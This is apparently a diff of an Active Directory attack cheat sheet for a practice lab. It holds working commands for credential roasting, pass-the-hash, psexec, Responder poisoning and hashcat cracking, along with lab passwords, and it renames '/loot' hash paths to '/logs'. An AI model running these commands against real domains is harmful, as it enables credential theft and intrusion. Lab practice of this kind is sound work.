@@ -9,8 +9,8 @@ nxc smb 192.168.56.10-23
 nxc smb 192.168.56.11 -u USER -p PASS --shares --sessions --loggedon-users
 nxc smb 192.168.56.11 -u USER -H NTHASH --local-auth
 nxc ldap 192.168.56.11 -u USER -p PASS --users --groups --trusted-for-delegation
-nxc ldap 192.168.56.11 -u USER -p PASS --asreproast /loot/hashes/asrep.txt
-nxc ldap 192.168.56.11 -u USER -p PASS --kerberoasting /loot/hashes/kerb.txt
+nxc ldap 192.168.56.11 -u USER -p PASS --asreproast /logs/hashes/asrep.txt
+nxc ldap 192.168.56.11 -u USER -p PASS --kerberoasting /logs/hashes/kerb.txt
 nxc mssql 192.168.56.22 -u jon.snow -p iknownothing -d north.sevenkingdoms.local
 nxc winrm 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_'
 nxc rdp 192.168.56.11 -u jon.snow -p iknownothing
@@ -37,7 +37,7 @@ ldapsearch -x -H ldap://192.168.56.11 -s base '' currentTime
 ## Impacket
 
 ```bash
-impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -dc-ip 192.168.56.11 -usersfile /loot/users.txt
+impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -dc-ip 192.168.56.11 -usersfile /logs/users.txt
 impacket-GetUserSPNs north.sevenkingdoms.local/hodor:hodor -dc-ip 192.168.56.11 -request
 impacket-getTGT north.sevenkingdoms.local/jon.snow:iknownothing -dc-ip 192.168.56.11
 impacket-psexec north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
@@ -73,6 +73,6 @@ responder -I eth0 -wd
 | NetNTLMv2 | 5600 | Responder / ntlmrelayx |
 
 ```bash
-hashcat -m 18200 /loot/hashes/asrep.txt /usr/share/wordlists/rockyou.txt
-hashcat -m 13100 /loot/hashes/kerb.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 /logs/hashes/asrep.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 /logs/hashes/kerb.txt /usr/share/wordlists/rockyou.txt
 ```
